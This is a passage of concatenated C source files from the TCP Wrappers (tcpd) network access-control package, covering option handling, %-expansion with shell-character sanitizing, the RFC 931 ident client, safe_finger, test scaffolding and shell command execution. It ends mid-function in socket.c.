static void nice_option(value, request)
char   *value;
struct request_info *request;
{
    int     niceval = 10;
    char    junk;

    if (value != 0 && sscanf(value, "%d%c", &niceval, &junk) != 1)
	tcpd_jump("bad nice value: \"%s\"", value);
    if (dry_run == 0 && nice(niceval) < 0)
	tcpd_warn("nice(%d): %m", niceval);
}

/* twist_option - replace process by shell command */

static void twist_option(value, request)
char   *value;
struct request_info *request;
{
    char   *error;

    if (dry_run != 0) {
	dry_run = 0;
    } else {
	if (resident > 0)
	    tcpd_jump("twist option in resident process");

	syslog(deny_severity, "twist %s to %s", eval_client(request), value);

	/* Before switching to the shell, set up stdin, stdout and stderr. */

#define maybe_dup2(from, to) ((from == to) ? to : (close(to), dup(from)))

	if (maybe_dup2(request->fd, 0) != 0 ||
	    maybe_dup2(request->fd, 1) != 1 ||
	    maybe_dup2(request->fd, 2) != 2) {
	    error = "twist_option: dup: %m";
	} else {
	    if (request->fd > 2)
		close(request->fd);
	    (void) execl("/bin/sh", "sh", "-c", value, (char *) 0);
	    error = "twist_option: /bin/sh: %m";
	}

	/* Something went wrong: we MUST terminate the process. */

	tcpd_warn(error);
	clean_exit(request);
    }
}

/* rfc931_option - look up remote user name */

static void rfc931_option(value, request)
char   *value;
struct request_info *request;
{
    int     timeout;
    char    junk;

    if (value != 0) {
	if (sscanf(value, "%d%c", &timeout, &junk) != 1 || timeout <= 0)
	    tcpd_jump("bad rfc931 timeout: \"%s\"", value);
	rfc931_timeout = timeout;
    }
    (void) eval_user(request);
}

/* setenv_option - set environment variable */

/* ARGSUSED */

static void setenv_option(value, request)
char   *value;
struct request_info *request;
{
    char   *var_value;

    if (*(var_value = value + strcspn(value, whitespace)))
	*var_value++ = 0;
    if (setenv(chop_string(value), chop_string(var_value), 1))
	tcpd_jump("memory allocation failure");
}

 /*
  * The severity option goes last because it comes with a huge amount of ugly
  * #ifdefs and tables.
  */

struct syslog_names {
    char   *name;
    int     value;
};

static struct syslog_names log_fac[] = {
#ifdef LOG_KERN
    "kern", LOG_KERN,
#endif
#ifdef LOG_USER
    "user", LOG_USER,
#endif
#ifdef LOG_MAIL
    "mail", LOG_MAIL,
#endif
#ifdef LOG_DAEMON
    "daemon", LOG_DAEMON,
#endif
#ifdef LOG_AUTH
    "auth", LOG_AUTH,
#endif
#ifdef LOG_LPR
    "lpr", LOG_LPR,
#endif
#ifdef LOG_NEWS
    "news", LOG_NEWS,
#endif
#ifdef LOG_UUCP
    "uucp", LOG_UUCP,
#endif
#ifdef LOG_CRON
    "cron", LOG_CRON,
#endif
#ifdef LOG_LOCAL0
    "local0", LOG_LOCAL0,
#endif
#ifdef LOG_LOCAL1
    "local1", LOG_LOCAL1,
#endif
#ifdef LOG_LOCAL2
    "local2", LOG_LOCAL2,
#endif
#ifdef LOG_LOCAL3
    "local3", LOG_LOCAL3,
#endif
#ifdef LOG_LOCAL4
    "local4", LOG_LOCAL4,
#endif
#ifdef LOG_LOCAL5
    "local5", LOG_LOCAL5,
#endif
#ifdef LOG_LOCAL6
    "local6", LOG_LOCAL6,
#endif
#ifdef LOG_LOCAL7
    "local7", LOG_LOCAL7,
#endif
    0,
};

static struct syslog_names log_sev[] = {
#ifdef LOG_EMERG
    "emerg", LOG_EMERG,
#endif
#ifdef LOG_ALERT
    "alert", LOG_ALERT,
#endif
#ifdef LOG_CRIT
    "crit", LOG_CRIT,
#endif
#ifdef LOG_ERR
    "err", LOG_ERR,
#endif
#ifdef LOG_WARNING
    "warning", LOG_WARNING,
#endif
#ifdef LOG_NOTICE
    "notice", LOG_NOTICE,
#endif
#ifdef LOG_INFO
    "info", LOG_INFO,
#endif
#ifdef LOG_DEBUG
    "debug", LOG_DEBUG,
#endif
    0,
};

/* severity_map - lookup facility or severity value */

static int severity_map(table, name)
struct syslog_names *table;
char   *name;
{
    struct syslog_names *t;

    for (t = table; t->name; t++)
	if (STR_EQ(t->name, name))
	    return (t->value);
    tcpd_jump("bad syslog facility or severity: \"%s\"", name);
    /* NOTREACHED */
}

/* severity_option - change logging severity for this event (Dave Mitchell) */

/* ARGSUSED */

static void severity_option(value, request)
char   *value;
struct request_info *request;
{
    char   *level = split_at(value, '.');

    allow_severity = deny_severity = level ?
	severity_map(log_fac, value) | severity_map(log_sev, level) :
	severity_map(log_sev, value);
}

/* get_field - return pointer to next field in string */

static char *get_field(string)
char   *string;
{
    static char *last = "";
    char   *src;
    char   *dst;
    char   *ret;
    int     ch;

    /*
     * This function returns pointers to successive fields within a given
     * string. ":" is the field separator; warn if the rule ends in one. It
     * replaces a "\:" sequence by ":", without treating the result of
     * substitution as field terminator. A null argument means resume search
     * where the previous call terminated. This function destroys its
     * argument.
     * 
     * Work from explicit source or from memory. While processing \: we
     * overwrite the input. This way we do not have to maintain buffers for
     * copies of input fields.
     */

    src = dst = ret = (string ? string : last);
    if (src[0] == 0)
	return (0);

    while (ch = *src) {
	if (ch == ':') {
	    if (*++src == 0)
		tcpd_warn("rule ends in \":\"");
	    break;
	}
	if (ch == '\\' && src[1] == ':')
	    src++;
	*dst++ = *src++;
    }
    last = src;
    *dst = 0;
    return (ret);
}

/* chop_string - strip leading and trailing blanks from string */

static char *chop_string(string)
register char *string;
{
    char   *start = 0;
    char   *end;
    char   *cp;

    for (cp = string; *cp; cp++) {
	if (!isspace(*cp)) {
	    if (start == 0)
		start = cp;
	    end = cp;
	}
    }
    return (start ? (end[1] = 0, start) : cp);
}
#ifndef lint
static char patchlevel[] = "@(#) patchlevel 7.4";
#endif
 /*
  * Replace %m by system error message.
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

#ifndef lint
static char sccsid[] = "@(#) percent_m.c 1.1 94/12/28 17:42:37";
#endif

#include <stdio.h>
#include <errno.h>
#include <string.h>

extern int errno;
#ifndef SYS_ERRLIST_DEFINED
extern char *sys_errlist[];
extern int sys_nerr;
#endif

#include "mystdarg.h"

char   *percent_m(obuf, ibuf)
char   *obuf;
char   *ibuf;
{
    char   *bp = obuf;
    char   *cp = ibuf;

    while (*bp = *cp)
	if (*cp == '%' && cp[1] == 'm') {
	    if (errno < sys_nerr && errno > 0) {
		strcpy(bp, sys_errlist[errno]);
	    } else {
		sprintf(bp, "Unknown error %d", errno);
	    }
	    bp += strlen(bp);
	    cp += 2;
	} else {
	    bp++, cp++;
	}
    return (obuf);
}
 /*
  * percent_x() takes a string and performs %<char> expansions. It aborts the
  * program when the expansion would overflow the output buffer. The result
  * of %<char> expansion may be passed on to a shell process. For this
  * reason, characters with a special meaning to shells are replaced by
  * underscores.
  * 
  * Diagnostics are reported through syslog(3).
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

#ifndef lint
static char sccsid[] = "@(#) percent_x.c 1.4 94/12/28 17:42:37";
#endif

/* System libraries. */

#include <stdio.h>
#include <syslog.h>
#include <string.h>

extern void exit();

/* Local stuff. */

#include "tcpd.h"

/* percent_x - do %<char> expansion, abort if result buffer is too small */

char   *percent_x(result, result_len, string, request)
char   *result;
int     result_len;
char   *string;
struct request_info *request;
{
    char   *bp = result;
    char   *end = result + result_len - 1;	/* end of result buffer */
    char   *expansion;
    int     expansion_len;
    static char ok_chars[] = "1234567890!@%-_=+:,./\
abcdefghijklmnopqrstuvwxyz\
ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    char   *str = string;
    char   *cp;
    int     ch;

    /*
     * Warning: we may be called from a child process or after pattern
     * matching, so we cannot use clean_exit() or tcpd_jump().
     */

    while (*str) {
	if (*str == '%' && (ch = str[1]) != 0) {
	    str += 2;
	    expansion =
		ch == 'a' ? eval_hostaddr(request->client) :
		ch == 'A' ? eval_hostaddr(request->server) :
		ch == 'c' ? eval_client(request) :
		ch == 'd' ? eval_daemon(request) :
		ch == 'h' ? eval_hostinfo(request->client) :
		ch == 'H' ? eval_hostinfo(request->server) :
		ch == 'n' ? eval_hostname(request->client) :
		ch == 'N' ? eval_hostname(request->server) :
		ch == 'p' ? eval_pid(request) :
		ch == 's' ? eval_server(request) :
		ch == 'u' ? eval_user(request) :
		ch == '%' ? "%" : (tcpd_warn("unrecognized %%%c", ch), "");
	    for (cp = expansion; *(cp += strspn(cp, ok_chars)); /* */ )
		*cp = '_';
	    expansion_len = cp - expansion;
	} else {
	    expansion = str++;
	    expansion_len = 1;
	}
	if (bp + expansion_len >= end) {
	    tcpd_warn("percent_x: expansion too long: %.30s...", result);
	    sleep(5);
	    exit(0);
	}
	memcpy(bp, expansion, expansion_len);
	bp += expansion_len;
    }
    *bp = 0;
    return (result);
}
syslog	1 0
tcpd_warn	0 0
tcpd_jump	0 0
 /*
  * The Dynix/PTX TLI implementation is not quite compatible with System V
  * Release 4. Some important functions are not present so we are limited to
  * IP-based services.
  * 
  * Diagnostics are reported through syslog(3).
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

#ifndef lint
static char sccsid[] = "@(#) ptx.c 1.3 94/12/28 17:42:38";
#endif

#ifdef PTX

/* System libraries. */

#include <sys/types.h>
#include <sys/tiuser.h>
#include <sys/socket.h>
#include <stropts.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <syslog.h>

/* Local stuff. */

#include "tcpd.h"

/* Forward declarations. */

static void ptx_sink();

/* tli_host - determine TLI endpoint info, PTX version */

void    tli_host(request)
struct request_info *request;
{
    static struct sockaddr_in client;
    static struct sockaddr_in server;

    /*
     * getpeerinaddr() was suggested by someone at Sequent. It seems to work
     * with connection-oriented (TCP) services such as rlogind and telnetd,
     * but it returns 0.0.0.0 with datagram (UDP) services. No problem: UDP
     * needs special treatment anyway, in case we must refuse service.
     */

    if (getpeerinaddr(request->fd, &client, sizeof(client)) == 0
	&& client.sin_addr.s_addr != 0) {
	request->client->sin = &client;
	if (getmyinaddr(request->fd, &server, sizeof(server)) == 0) {
	    request->server->sin = &server;
	} else {
	    tcpd_warn("warning: getmyinaddr: %m");
	}
	sock_methods(request);

    } else {

	/*
	 * Another suggestion was to temporarily switch to the socket
	 * interface, identify the endpoint addresses with socket calls, then
	 * to switch back to TLI. This seems to works OK with UDP services,
	 * which is exactly what we should be looking at right now.
	 */

#define SWAP_MODULE(f, old, new) (ioctl(f, I_POP, old), ioctl(f, I_PUSH, new))

	if (SWAP_MODULE(request->fd, "timod", "sockmod") != 0)
	    tcpd_warn("replace timod by sockmod: %m");
	sock_host(request);
	if (SWAP_MODULE(request->fd, "sockmod", "timod") != 0)
	    tcpd_warn("replace sockmod by timod: %m");
	if (request->sink != 0)
	    request->sink = ptx_sink;
    }
}

/* ptx_sink - absorb unreceived IP datagram */

static void ptx_sink(fd)
int     fd;
{
    char    buf[BUFSIZ];
    struct sockaddr sa;
    int     size = sizeof(sa);

    /*
     * Eat up the not-yet received datagram. Where needed, switch to the
     * socket programming interface.
     */

    if (ioctl(fd, I_FIND, "timod") != 0)
	ioctl(fd, I_POP, "timod");
    if (ioctl(fd, I_FIND, "sockmod") == 0)
	ioctl(fd, I_PUSH, "sockmod");
    (void) recvfrom(fd, buf, sizeof(buf), 0, &sa, &size);
}

#endif /* PTX */
 /*
  * refuse() reports a refused connection, and takes the consequences: in
  * case of a datagram-oriented service, the unread datagram is taken from
  * the input queue (or inetd would see the same datagram again and again);
  * the program is terminated.
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

#ifndef lint
static char sccsid[] = "@(#) refuse.c 1.5 94/12/28 17:42:39";
#endif

/* System libraries. */

#include <stdio.h>
#include <syslog.h>

/* Local stuff. */

#include "tcpd.h"

/* refuse - refuse request */

void    refuse(request)
struct request_info *request;
{
    syslog(deny_severity, "refused connect from %s", eval_client(request));
    clean_exit(request);
    /* NOTREACHED */
}

 /*
  * rfc931() speaks a common subset of the RFC 931, AUTH, TAP, IDENT and RFC
  * 1413 protocols. It queries an RFC 931 etc. compatible daemon on a remote
  * host to look up the owner of a connection. The information should not be
  * used for authentication purposes. This routine intercepts alarm signals.
  * 
  * Diagnostics are reported through syslog(3).
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

#ifndef lint
static char sccsid[] = "@(#) rfc931.c 1.10 95/01/02 16:11:34";
#endif

/* System libraries. */

#include <stdio.h>
#include <syslog.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <setjmp.h>
#include <signal.h>
#include <string.h>

/* Local stuff. */

#include "tcpd.h"

#define	RFC931_PORT	113		/* Semi-well-known port */
#define	ANY_PORT	0		/* Any old port will do */

int     rfc931_timeout = RFC931_TIMEOUT;/* Global so it can be changed */

static jmp_buf timebuf;

/* fsocket - open stdio stream on top of socket */

static FILE *fsocket(domain, type, protocol)
int     domain;
int     type;
int     protocol;
{
    int     s;
    FILE   *fp;

    if ((s = socket(domain, type, protocol)) < 0) {
	tcpd_warn("socket: %m");
	return (0);
    } else {
	if ((fp = fdopen(s, "r+")) == 0) {
	    tcpd_warn("fdopen: %m");
	    close(s);
	}
	return (fp);
    }
}

/* timeout - handle timeouts */

static void timeout(sig)
int     sig;
{
    longjmp(timebuf, sig);
}

/* rfc931 - return remote user name, given socket structures */

void    rfc931(rmt_sin, our_sin, dest)
struct sockaddr_in *rmt_sin;
struct sockaddr_in *our_sin;
char   *dest;
{
    unsigned rmt_port;
    unsigned our_port;
    struct sockaddr_in rmt_query_sin;
    struct sockaddr_in our_query_sin;
    char    user[256];			/* XXX */
    char    buffer[512];		/* XXX */
    char   *cp;
    char   *result = unknown;
    FILE   *fp;

    /*
     * Use one unbuffered stdio stream for writing to and for reading from
     * the RFC931 etc. server. This is done because of a bug in the SunOS
     * 4.1.x stdio library. The bug may live in other stdio implementations,
     * too. When we use a single, buffered, bidirectional stdio stream ("r+"
     * or "w+" mode) we read our own output. Such behaviour would make sense
     * with resources that support random-access operations, but not with
     * sockets.
     */

    if ((fp = fsocket(AF_INET, SOCK_STREAM, 0)) != 0) {
	setbuf(fp, (char *) 0);

	/*
	 * Set up a timer so we won't get stuck while waiting for the server.
	 */

	if (setjmp(timebuf) == 0) {
	    signal(SIGALRM, timeout);
	    alarm(rfc931_timeout);

	    /*
	     * Bind the local and remote ends of the query socket to the same
	     * IP addresses as the connection under investigation. We go
	     * through all this trouble because the local or remote system
	     * might have more than one network address. The RFC931 etc.
	     * client sends only port numbers; the server takes the IP
	     * addresses from the query socket.
	     */

	    our_query_sin = *our_sin;
	    our_query_sin.sin_port = htons(ANY_PORT);
	    rmt_query_sin = *rmt_sin;
	    rmt_query_sin.sin_port = htons(RFC931_PORT);

	    if (bind(fileno(fp), (struct sockaddr *) & our_query_sin,
		     sizeof(our_query_sin)) >= 0 &&
		connect(fileno(fp), (struct sockaddr *) & rmt_query_sin,
			sizeof(rmt_query_sin)) >= 0) {

		/*
		 * Send query to server. Neglect the risk that a 13-byte
		 * write would have to be fragmented by the local system and
		 * cause trouble with buggy System V stdio libraries.
		 */

		fprintf(fp, "%u,%u\r\n",
			ntohs(rmt_sin->sin_port),
			ntohs(our_sin->sin_port));
		fflush(fp);

		/*
		 * Read response from server. Use fgets()/sscanf() so we can
		 * work around System V stdio libraries that incorrectly
		 * assume EOF when a read from a socket returns less than
		 * requested.
		 */

		if (fgets(buffer, sizeof(buffer), fp) != 0
		    && ferror(fp) == 0 && feof(fp) == 0
		    && sscanf(buffer, "%u , %u : USERID :%*[^:]:%255s",
			      &rmt_port, &our_port, user) == 3
		    && ntohs(rmt_sin->sin_port) == rmt_port
		    && ntohs(our_sin->sin_port) == our_port) {

		    /*
		     * Strip trailing carriage return. It is part of the
		     * protocol, not part of the data.
		     */

		    if (cp = strchr(user, '\r'))
			*cp = 0;
		    result = user;
		}
	    }
	    alarm(0);
	}
	fclose(fp);
    }
    STRN_CPY(dest, result, STRING_LENGTH);
}
 /*
  * safe_finger - finger client wrapper that protects against nasty stuff
  * from finger servers. Use this program for automatic reverse finger
  * probes, not the raw finger command.
  * 
  * Build with: cc -o safe_finger safe_finger.c
  * 
  * The problem: some programs may react to stuff in the first column. Other
  * programs may get upset by thrash anywhere on a line. File systems may
  * fill up as the finger server keeps sending data. Text editors may bomb
  * out on extremely long lines. The finger server may take forever because
  * it is somehow wedged. The code below takes care of all this badness.
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

#ifndef lint
static char sccsid[] = "@(#) safe_finger.c 1.4 94/12/28 17:42:41";
#endif

/* System libraries */

#include <sys/types.h>
#include <sys/stat.h>
#include <signal.h>
#include <stdio.h>
#include <ctype.h>
#include <pwd.h>

extern void exit();

/* Local stuff */

char    path[] = "PATH=/bin:/usr/bin:/usr/ucb:/usr/bsd:/etc:/usr/etc:/usr/sbin";

#define	TIME_LIMIT	60		/* Do not keep listinging forever */
#define	INPUT_LENGTH	100000		/* Do not keep listinging forever */
#define	LINE_LENGTH	128		/* Editors can choke on long lines */
#define	FINGER_PROGRAM	"finger"	/* Most, if not all, UNIX systems */
#define	UNPRIV_NAME	"nobody"	/* Preferred privilege level */
#define	UNPRIV_UGID	32767		/* Default uid and gid */

int     finger_pid;

void    cleanup(sig)
int     sig;
{
    kill(finger_pid, SIGKILL);
    exit(0);
}

main(argc, argv)
int     argc;
char  **argv;
{
    int     c;
    int     line_length = 0;
    int     finger_status;
    int     wait_pid;
    int     input_count = 0;
    struct passwd *pwd;

    /*
     * First of all, let's don't run with superuser privileges.
     */
    if (getuid() == 0 || geteuid() == 0) {
	if ((pwd = getpwnam(UNPRIV_NAME)) && pwd->pw_uid > 0) {
	    setgid(pwd->pw_gid);
	    setuid(pwd->pw_uid);
	} else {
	    setgid(UNPRIV_UGID);
	    setuid(UNPRIV_UGID);
	}
    }

    /*
     * Redirect our standard input through the raw finger command.
     */
    if (putenv(path)) {
	fprintf(stderr, "%s: putenv: out of memory", argv[0]);
	exit(1);
    }
    argv[0] = FINGER_PROGRAM;
    finger_pid = pipe_stdin(argv);

    /*
     * Don't wait forever (Peter Wemm <peter@gecko.DIALix.oz.au>).
     */
    signal(SIGALRM, cleanup);
    (void) alarm(TIME_LIMIT);

    /*
     * Main filter loop.
     */
    while ((c = getchar()) != EOF) {
	if (input_count++ >= INPUT_LENGTH) {	/* don't listen forever */
	    fclose(stdin);
	    printf("\n\n Input truncated to %d bytes...\n", input_count - 1);
	    break;
	}
	if (c == '\n') {			/* good: end of line */
	    putchar(c);
	    line_length = 0;
	} else {
	    if (line_length >= LINE_LENGTH) {	/* force end of line */
		printf("\\\n");
		line_length = 0;
	    }
	    if (line_length == 0) {		/* protect left margin */
		putchar(' ');
		line_length++;
	    }
	    if (isascii(c) && (isprint(c) || isspace(c))) {	/* text */
		if (c == '\\') {
		    putchar(c);
		    line_length++;
		}
		putchar(c);
		line_length++;
	    } else {				/* quote all other thash */
		printf("\\%03o", c & 0377);
		line_length += 4;
	    }
	}
    }

    /*
     * Wait until the finger child process has terminated and account for its
     * exit status. Which will always be zero on most systems.
     */
    while ((wait_pid = wait(&finger_status)) != -1 && wait_pid != finger_pid)
	 /* void */ ;
    return (wait_pid != finger_pid || finger_status != 0);
}

/* perror_exit - report system error text and terminate */

void    perror_exit(text)
char   *text;
{
    perror(text);
    exit(1);
}

/* pipe_stdin - pipe stdin through program (from my ANSI to OLD C converter) */

int     pipe_stdin(argv)
char  **argv;
{
    int     pipefds[2];
    int     pid;
    int     i;
    struct stat st;

    /*
     * The code that sets up the pipe requires that file descriptors 0,1,2
     * are already open. All kinds of mysterious things will happen if that
     * is not the case. The following loops makes sure that descriptors 0,1,2
     * are set up properly.
     */

    for (i = 0; i < 3; i++) {
	if (fstat(i, &st) == -1 && open("/dev/null", 2) != i)
	    perror_exit("open /dev/null");
    }

    /*
     * Set up the pipe that interposes the command into our standard input
     * stream.
     */

    if (pipe(pipefds))
	perror_exit("pipe");

    switch (pid = fork()) {
    case -1:					/* error */
	perror_exit("fork");
	/* NOTREACHED */
    case 0:					/* child */
	(void) close(pipefds[0]);		/* close reading end */
	(void) close(1);			/* connect stdout to pipe */
	if (dup(pipefds[1]) != 1)
	    perror_exit("dup");
	(void) close(pipefds[1]);		/* close redundant fd */
	(void) execvp(argv[0], argv);
	perror_exit(argv[0]);
	/* NOTREACHED */
    default:					/* parent */
	(void) close(pipefds[1]);		/* close writing end */
	(void) close(0);			/* connect stdin to pipe */
	if (dup(pipefds[0]) != 0)
	    perror_exit("dup");
	(void) close(pipefds[0]);		/* close redundant fd */
	return (pid);
    }
}
 /*
  * Routines for testing only. Not really industrial strength.
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

#ifndef lint
static char sccs_id[] = "@(#) scaffold.c 1.5 95/01/03 09:13:48";
#endif

/* System libraries. */

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>
#include <syslog.h>
#include <setjmp.h>
#include <string.h>

#ifndef INADDR_NONE
#define	INADDR_NONE	(-1)		/* XXX should be 0xffffffff */
#endif

extern char *malloc();

/* Application-specific. */

#include "tcpd.h"
#include "scaffold.h"

 /*
  * These are referenced by the options module and by rfc931.c.
  */
int     allow_severity = SEVERITY;
int     deny_severity = LOG_WARNING;
int     rfc931_timeout = RFC931_TIMEOUT;

/* dup_hostent - create hostent in one memory block */

static struct hostent *dup_hostent(hp)
struct hostent *hp;
{
    struct hostent_block {
	struct hostent host;
	char   *addr_list[1];
    };
    struct hostent_block *hb;
    int     count;
    char   *data;
    char   *addr;

    for (count = 0; hp->h_addr_list[count] != 0; count++)
	 /* void */ ;

    if ((hb = (struct hostent_block *) malloc(sizeof(struct hostent_block)
			 + (hp->h_length + sizeof(char *)) * count)) == 0) {
	fprintf(stderr, "Sorry, out of memory\n");
	exit(1);
    }
    memset((char *) &hb->host, 0, sizeof(hb->host));
    hb->host.h_length = hp->h_length;
    hb->host.h_addr_list = hb->addr_list;
    hb->host.h_addr_list[count] = 0;
    data = (char *) (hb->host.h_addr_list + count + 1);

    for (count = 0; (addr = hp->h_addr_list[count]) != 0; count++) {
	hb->host.h_addr_list[count] = data + hp->h_length * count;
	memcpy(hb->host.h_addr_list[count], addr, hp->h_length);
    }
    return (&hb->host);
}

/* find_inet_addr - find all addresses for this host, result to free() */

struct hostent *find_inet_addr(host)
char   *host;
{
    struct in_addr addr;
    struct hostent *hp;
    static struct hostent h;
    static char *addr_list[2];

    /*
     * Host address: translate it to internal form.
     */
    if ((addr.s_addr = dot_quad_addr(host)) != INADDR_NONE) {
	h.h_addr_list = addr_list;
	h.h_addr_list[0] = (char *) &addr;
	h.h_length = sizeof(addr);
	return (dup_hostent(&h));
    }

    /*
     * Map host name to a series of addresses. Watch out for non-internet
     * forms or aliases. The NOT_INADDR() is here in case gethostbyname() has
     * been "enhanced" to accept numeric addresses. Make a copy of the
     * address list so that later gethostbyXXX() calls will not clobber it.
     */
    if (NOT_INADDR(host) == 0) {
	tcpd_warn("%s: not an internet address", host);
	return (0);
    }
    if ((hp = gethostbyname(host)) == 0) {
	tcpd_warn("%s: host not found", host);
	return (0);
    }
    if (hp->h_addrtype != AF_INET) {
	tcpd_warn("%d: not an internet host", hp->h_addrtype);
	return (0);
    }
    if (STR_NE(host, hp->h_name)) {
	tcpd_warn("%s: hostname alias", host);
	tcpd_warn("(official name: %s)", hp->h_name);
    }
    return (dup_hostent(hp));
}

/* check_dns - give each address thorough workout, return address count */

int     check_dns(host)
char   *host;
{
    struct request_info request;
    struct sockaddr_in sin;
    struct hostent *hp;
    int     count;
    char   *addr;

    if ((hp = find_inet_addr(host)) == 0)
	return (0);
    request_init(&request, RQ_CLIENT_SIN, &sin, 0);
    sock_methods(&request);
    memset((char *) &sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;

    for (count = 0; (addr = hp->h_addr_list[count]) != 0; count++) {
	memcpy((char *) &sin.sin_addr, addr, sizeof(sin.sin_addr));

	/*
	 * Force host name and address conversions. Use the request structure
	 * as a cache. Detect hostname lookup problems. Any name/name or
	 * name/address conflicts will be reported while eval_hostname() does
	 * its job.
	 */
	request_set(&request, RQ_CLIENT_ADDR, "", RQ_CLIENT_NAME, "", 0);
	if (STR_EQ(eval_hostname(request.client), unknown))
	    tcpd_warn("host address %s->name lookup failed",
		      eval_hostaddr(request.client));
    }
    free((char *) hp);
    return (count);
}

/* dummy function to intercept the real shell_cmd() */

/* ARGSUSED */

void    shell_cmd(command)
char   *command;
{
    if (hosts_access_verbose)
	printf("command: %s", command);
}

/* dummy function  to intercept the real clean_exit() */

/* ARGSUSED */

void    clean_exit(request)
struct request_info *request;
{
    exit(0);
}

/* dummy function  to intercept the real rfc931() */

/* ARGSUSED */

void    rfc931(request)
struct request_info *request;
{
    strcpy(request->user, unknown);
}

/* check_path - examine accessibility */

int     check_path(path, st)
char   *path;
struct stat *st;
{
    struct stat stbuf;
    char    buf[BUFSIZ];

    if (stat(path, st) < 0)
	return (-1);
#ifdef notdef
    if (st->st_uid != 0)
	tcpd_warn("%s: not owned by root", path);
    if (st->st_mode & 020)
	tcpd_warn("%s: group writable", path);
#endif
    if (st->st_mode & 002)
	tcpd_warn("%s: world writable", path);
    if (path[0] == '/' && path[1] != 0) {
	strrchr(strcpy(buf, path), '/')[0] = 0;
	(void) check_path(buf[0] ? buf : "/", &stbuf);
    }
    return (0);
}
 /*
  * @(#) scaffold.h 1.3 94/12/31 18:19:19
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

extern struct hostent *find_inet_addr();
extern int check_dns();
extern int check_path();
 /*
  * Some systems do not have setenv(). This one is modeled after 4.4 BSD, but
  * is implemented in terms of portable primitives only: getenv(), putenv()
  * and malloc(). It should therefore be safe to use on every UNIX system.
  * 
  * If clobber == 0, do not overwrite an existing variable.
  * 
  * Returns nonzero if memory allocation fails.
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

#ifndef lint
static char sccsid[] = "@(#) setenv.c 1.1 93/03/07 22:47:58";
#endif

/* setenv - update or insert environment (name,value) pair */

int     setenv(name, value, clobber)
char   *name;
char   *value;
int     clobber;
{
    char   *malloc();
    char   *getenv();
    char   *cp;

    if (clobber == 0 && getenv(name) != 0)
	return (0);
    if ((cp = malloc(strlen(name) + strlen(value) + 2)) == 0)
	return (1);
    sprintf(cp, "%s=%s", name, value);
    return (putenv(cp));
}
 /*
  * shell_cmd() takes a shell command after %<character> substitutions. The
  * command is executed by a /bin/sh child process, with standard input,
  * standard output and standard error connected to /dev/null.
  * 
  * Diagnostics are reported through syslog(3).
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

#ifndef lint
static char sccsid[] = "@(#) shell_cmd.c 1.5 94/12/28 17:42:44";
#endif

/* System libraries. */

#include <sys/types.h>
#include <sys/param.h>
#include <signal.h>
#include <stdio.h>
#include <syslog.h>
#include <string.h>

extern void exit();

/* Local stuff. */

#include "tcpd.h"

/* Forward declarations. */

static void do_child();

/* shell_cmd - execute shell command */

void    shell_cmd(command)
char   *command;
{
    int     child_pid;
    int     wait_pid;

    /*
     * Most of the work is done within the child process, to minimize the
     * risk of damage to the parent.
     */

    switch (child_pid = fork()) {
    case -1:					/* error */
	tcpd_warn("cannot fork: %m");
	break;
    case 00:					/* child */
	do_child(command);
	/* NOTREACHED */
    default:					/* parent */
	while ((wait_pid = wait((int *) 0)) != -1 && wait_pid != child_pid)
	     /* void */ ;
    }
}

/* do_child - exec command with { stdin, stdout, stderr } to /dev/null */

static void do_child(command)
char   *command;
{
    char   *error;
    int     tmp_fd;

    /*
     * Systems with POSIX sessions may send a SIGHUP to grandchildren if the
     * child exits first. This is sick, sessions were invented for terminals.
     */

    signal(SIGHUP, SIG_IGN);

    /* Set up new stdin, stdout, stderr, and exec the shell command. */

    for (tmp_fd = 0; tmp_fd < 3; tmp_fd++)
	(void) close(tmp_fd);
    if (open("/dev/null", 2) != 0) {
	error = "open /dev/null: %m";
    } else if (dup(0) != 1 || dup(0) != 2) {
	error = "dup: %m";
    } else {
	(void) execl("/bin/sh", "sh", "-c", command, (char *) 0);
	error = "execl /bin/sh: %m";
    }

    /* Something went wrong. We MUST terminate the child process. */

    tcpd_warn(error);
    _exit(0);
}
 /*
  * This module determines the type of socket (datagram, stream), the client
  * socket address and port, the server socket address and port. In addition,
  * it provides methods to map a transport address to a printable host name
  * or address. Socket address information results are in static memory.
  * 
  * The result from the hostname lookup method is STRING_PARANOID when a host
  * pretends to have someone elses name, or when a host name is available but
  * could not be verified.
  * 
  * When lookup or conversion fails the result is set to STRING_UNKNOWN.
  * 
  * Diagnostics are reported through syslog(3).
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

#ifndef lint
static char sccsid[] = "@(#) socket.c 1.14 95/01/30 19:51:50";
#endif

/* System libraries. */

#include <sys/types.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <syslog.h>
#include <string.h>

extern char *inet_ntoa();

/* Local stuff. */

#include "tcpd.h"

/* Forward declarations. */

static void sock_sink();

#ifdef APPEND_DOT

 /*
  * Speed up DNS lookups by terminating the host name with a dot. Should be
  * done with care. The speedup can give problems with lookups from sources
  * that lack DNS-style trailing dot magic, such as local files or NIS maps.
  */

static struct hostent *gethostbyname_dot(name)
char   *name;
{
    char    dot_name[MAXHOSTNAMELEN + 1];

    /*
     * Don't append dots to unqualified names. Such names are likely to come
     * from local hosts files or from NIS.
     */

    if (strchr(name, '.') == 0 || strlen(name) >= MAXHOSTNAMELEN - 1) {
	return (gethostbyname(name));
    } else {
	sprintf(dot_name, "%s.", name);
	return (gethostbyname(dot_name));
    }
}

#define gethostbyname gethostbyname_dot
#endif

/* sock_host - look up endpoint addresses and install conversion methods */

void    sock_host(request)
